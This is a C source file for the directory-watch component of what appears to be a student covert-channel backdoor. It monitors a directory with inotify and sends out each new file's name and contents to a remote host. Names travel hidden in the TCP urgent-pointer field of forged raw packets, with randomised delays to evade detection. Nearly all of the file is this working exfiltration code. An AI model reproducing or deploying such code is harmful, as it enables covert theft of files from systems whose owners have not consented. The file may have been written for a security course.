/*==============================================================================
|   SOURCE:     dir_watch.c
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Source file for threaded directory watch component of program.
|               Holds functions for setting up monitor watch on client specified
|               directory and exfiltrating any new files that are created in the
|               specified directory.
==============================================================================*/
#include "../include/dir_watch.h"
#include "../include/server.h"
#include <stdio.h>
#include <string.h>
#include <sys/inotify.h>
#include <sys/select.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <signal.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <errno.h>

/*------------------------------------------------------------------------------
|   FUNCTION:   void *run_dir_watch(void *ptr)
|                   *ptr - arguments for directory watch thread
|
|   RETURN:     void pointer
|
|   AUTHOR:     Aman Abdulla
|
|   MODIFIED:   Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Uses inotify to monitor a client specified directory on the
|               server. Monitors for CREATE events in directory. When a new file
|               is created it sends the file to client machine.
|
|               Base code was taken from Aman Abdulla's directory watch notes
|               that contained code for a basic directory monitor.
------------------------------------------------------------------------------*/
void *run_dir_watch(void *ptr)
{

    Dir_Watch_Args *dw_args = ptr;  // get arguments
    fflush(stdout);
    int len, i, ret, fd, wd;
    static struct inotify_event *event;
    fd_set rfds;
    char buf[BUF_LEN];

    // create inotify file descriptor
    fd = inotify_init();
    if (fd < 0)
        perror ("inotify_init");

    // start watching client specified directory
    wd = inotify_add_watch (fd, dw_args->dir, (uint32_t)IN_CREATE);

    if (wd < 0)
        perror ("inotify_add_watch");

    FD_ZERO (&rfds);
	FD_SET (fd, &rfds);

    // monitor loop
    while(1)
    {
        ret = select (fd + 1, &rfds, NULL, NULL, NULL);
        len = read (fd, buf, BUF_LEN);

        i = 0;
        if (len < 0)
        {
                if (errno == EINTR) /* need to reissue system call */
                perror ("read");
                else
                        perror ("read");
        }
        else if (!len) /* BUF_LEN too small? */
        {
            printf ("buffer too small!\n");
            exit (1);
        }

        while (i < len)
        {
            event = (struct inotify_event *) &buf[i];
            i += EVENT_SIZE + event->len;
        }

        if (ret < 0)
			perror ("select");
        else if (FD_ISSET (fd, &rfds)) // CREATE event occured
        {
            char filepath[BUF_MED];
            memset(filepath, '\0', sizeof(filepath));
            strcpy(filepath, dw_args->dir);
            strcat(filepath, event->name);

            send_file_name(event->name, &(dw_args->srv_args));
            send_file(filepath, 'd', &(dw_args->srv_args));
        }
    }

    pthread_exit(NULL);
}

/*------------------------------------------------------------------------------
|   FUNCTION:   void send_file_name(char *name, Server_Args *srv_args)
|                   *name - name of file to send to client
|                   *srv_args - contains client IP to send to
|
|   RETURN:     void
|
|   AUTHOR:     Alex Zielinski
|
|   DATE:       Dec 3, 2018
|
|   INFO:       Sends the name of the file to the client so the client knows
|               what the new file is called.
------------------------------------------------------------------------------*/
void send_file_name(char *name, Server_Args *srv_args)
{
    int delay;

    // random seed
    time_t t;
    srand((unsigned) time(&t));

    // create socket
    int sd;
    if((sd = create_socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1)
        pthread_exit(NULL);

    // iterate thru name char by char
    for(size_t i = 0; i < strlen(name); i++)
    {
        struct sockaddr_in sin;
        Packet pkt;

        // delay sending
        delay = rand() % srv_args->max_delay + srv_args->min_delay;
        sleep(delay);

        // forge IP and TCP
        forge_ip(&pkt, 'n', inet_addr(srv_args->my_ip), inet_addr(srv_args->host_ip));
        forge_tcp(&pkt);

        // Encode char into urgent pointer
        pkt.tcp.urg_ptr = name[i];

        // check sums
        pkt.ip.check = in_cksum((unsigned short *)&pkt.ip, sizeof(struct iphdr));
        pkt.tcp.check = in_cksum((unsigned short *)&pkt.tcp, sizeof(struct tcphdr));

        // check sums
        pkt.ip.check = in_cksum((unsigned short *)&pkt.ip, sizeof(struct iphdr));
        pkt.tcp.check = in_cksum((unsigned short *)&pkt.tcp, sizeof(struct tcphdr));

        // set sockaddr
        sin.sin_family = AF_INET;
        sin.sin_addr.s_addr = pkt.ip.daddr;
        sin.sin_port = pkt.tcp.source;

        // send packet
        if(sendto(sd, &pkt, sizeof(pkt), 0, (struct sockaddr *)&sin, sizeof(sin)) == -1)
        {
            printf("\nError sending data: %s\n\n", strerror(errno));
            close(sd);
            pthread_exit(NULL);
        }
    }

    // send EOT
    struct sockaddr_in sin;
    Packet pkt;

    // delay sending
    delay = rand() % srv_args->max_delay + srv_args->min_delay;
    sleep(delay);

    // forge IP and TCP
    forge_ip(&pkt, 'n', inet_addr(srv_args->my_ip), inet_addr(srv_args->host_ip));
    forge_tcp(&pkt);

    // Encode char into urgent pointer
    pkt.tcp.urg_ptr = '\0';

    // check sums
    pkt.ip.check = in_cksum((unsigned short *)&pkt.ip, sizeof(struct iphdr));
    pkt.tcp.check = in_cksum((unsigned short *)&pkt.tcp, sizeof(struct tcphdr));

    // check sums
    pkt.ip.check = in_cksum((unsigned short *)&pkt.ip, sizeof(struct iphdr));
    pkt.tcp.check = in_cksum((unsigned short *)&pkt.tcp, sizeof(struct tcphdr));

    // set sockaddr
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = pkt.ip.daddr;
    sin.sin_port = pkt.tcp.source;

    // send packet
    if(sendto(sd, &pkt, sizeof(pkt), 0, (struct sockaddr *)&sin, sizeof(sin)) == -1)
    {
        printf("\nError sending data: %s\n\n", strerror(errno));
        close(sd);
        pthread_exit(NULL);
    }

    close(sd);
}
